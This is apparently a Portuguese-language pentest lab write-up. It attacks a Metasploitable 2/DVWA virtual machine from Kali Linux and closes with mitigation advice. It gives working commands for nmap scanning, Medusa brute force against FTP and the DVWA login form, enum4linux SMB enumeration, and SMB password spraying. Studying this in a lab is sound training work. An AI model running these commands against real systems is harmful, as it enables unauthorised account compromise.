# 🛡️ Projeto: Ataques de Força Bruta com Medusa em Ambientes Vulneráveis

**Kali Linux • Metasploitable 2 • DVWA • Medusa**

Este projeto simula cenários reais de pentest utilizando o Kali Linux
como máquina atacante e o Metasploitable 2 (contendo DVWA) como máquina
alvo, com foco em ataques de **força bruta**, **automação de login
web**, **enumeração de serviços** e **password spraying**.\
O objetivo é entender como ataques ocorrem na prática e como
preveni-los.

------------------------------------------------------------------------

## 📌 Sumário

-   [Configuração do Ambiente](#configuração-do-ambiente)
-   [Varredura Inicial com Nmap](#varredura-inicial-com-nmap)
-   [Ataque 1: Força Bruta em FTP](#ataque-1-força-bruta-em-ftp)
-   [Ataque 2: Força Bruta em Formulário Web
    (DVWA)](#ataque-2-força-bruta-em-formulário-web-dvwa)
-   [Ataque 3: Enumeração em SMB
    (enum4linux)](#ataque-3-enumeração-em-smb-enum4linux)
-   [Ataque 4: Password Spraying em
    SMB](#ataque-4-password-spraying-em-smb)
-   [Recomendações de Mitigação](#recomendações-de-mitigação)
-   [Aprendizados](#aprendizados)

------------------------------------------------------------------------

## 🖥️ Configuração do Ambiente

Foram utilizadas duas máquinas virtuais no VirtualBox:

-   **Kali Linux** -- máquina atacante\
-   **Metasploitable 2** -- máquina vulnerável contendo serviços como
    FTP, SSH, SMB e DVWA

📡 *Ambas configuradas em rede interna (Host-Only).*

### Testando conexão entre as máquinas

``` bash
ping -c 4 192.168.56.101
```

------------------------------------------------------------------------

## 🔎 Varredura Inicial com Nmap

Antes de realizar qualquer ataque, foi executada uma varredura para
identificar portas abertas e serviços ativos:

``` bash
nmap -sV -p 21,22,80,139,445 192.168.56.101
```

A análise retornou portas importantes:

-   **FTP (21)** --- ativo\
-   **HTTP (80)** --- DVWA acessível\
-   **SMB (445/139)** --- disponível para enumeração

Essas portas serviram como base para os testes seguintes.

------------------------------------------------------------------------

## 🔐 Ataque 1: Força Bruta em FTP

1.  Criação de wordlists simples:

``` bash
echo -e "user
msfadmin
admin
root" > users.txt
echo -e "123456
password
qwerty
msfadmin" > pass.txt
```

2.  Execução do ataque com **Medusa**:

``` bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

✔ **Resultado:** credenciais válidas foram encontradas e o acesso ao FTP
foi obtido.

------------------------------------------------------------------------

## 🌐 Ataque 2: Força Bruta em Formulário Web (DVWA)

Após identificar os parâmetros de login no DVWA, o ataque foi
automatizado com Medusa:

``` bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http -m PAGE:'dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
```

✔ **Resultado:** credenciais corretas foram descobertas e o acesso ao
DVWA foi obtido.

------------------------------------------------------------------------

## 📁 Ataque 3: Enumeração em SMB (enum4linux)

Antes do password spraying, foi realizada a **enumeração de usuários**
no SMB utilizando o enum4linux.

### Comando utilizado:

``` bash
enum4linux -a 192.168.56.101 | tee enum4_output.txt
```

✔ **Resultado:** foram identificados usuários válidos do sistema.

### Criação da wordlist baseada na enumeração:

``` bash
echo -e "user
msfadmin
service" > smb_users.txt
```

------------------------------------------------------------------------

## 💥 Ataque 4: Password Spraying em SMB

Com os usuários identificados, foi criada uma wordlist de senhas para
password spraying:

``` bash
echo -e "password
123456
Welcome123
msfadmin" > senhas_spray.txt
```

### Execução do ataque:

``` bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt
```

### Validação do acesso:

``` bash
smbclient -L 192.168.56.101 -U msfadmin
```

✔ **Resultado:** o login SMB foi bem-sucedido.

------------------------------------------------------------------------

## 🛡️ Recomendações de Mitigação

-   Políticas rígidas de **senhas fortes**
-   Implementação de **MFA**
-   Bloqueio de conta após tentativas seguidas
-   Desativar serviços desnecessários como FTP e SMB antigos
-   Auditoria e monitoramento contínuo
-   Rate limiting em formulários de login

------------------------------------------------------------------------

## 📚 Aprendizados

Com este projeto foi possível:

-   Aplicar técnicas de enumeração com `enum4linux`
-   Realizar ataques de força bruta e password spraying
-   Criar wordlists personalizadas
-   Entender diferenças entre abordagens ofensivas
-   Reforçar a importância de medidas defensivas simples
